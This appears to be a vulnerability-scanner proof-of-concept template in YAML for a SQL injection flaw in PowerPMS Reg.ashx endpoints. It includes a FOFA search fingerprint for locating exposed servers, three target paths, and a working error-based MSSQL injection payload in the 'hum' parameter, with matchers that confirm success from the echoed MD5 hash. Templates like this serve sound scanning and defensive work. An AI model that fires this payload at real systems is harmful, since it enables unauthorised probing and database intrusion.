id: poc-yaml-powerpms-reg-ashx-sqli
info:
  name: 普华 PowerPMS Reg.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: powerpms
  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
  paths: 'weixin3.0/Reg.ashx

    weixin3.0/static/Reg.ashx

    PowerMobile2/Reg.ashx

    '
requests:
- method: POST
  path: /{{.paths}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: hum=1'and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: 'status_code == 200 &&

    contains(body,"0x" + t2) &&

    contains(body,"\"success\":false") &&

    !contains(body,"<") &&

    matches(body,"转换成数据类型(.*?)时失败") &&

    matches(body,"在将(.*?)值")

    '
transport: http
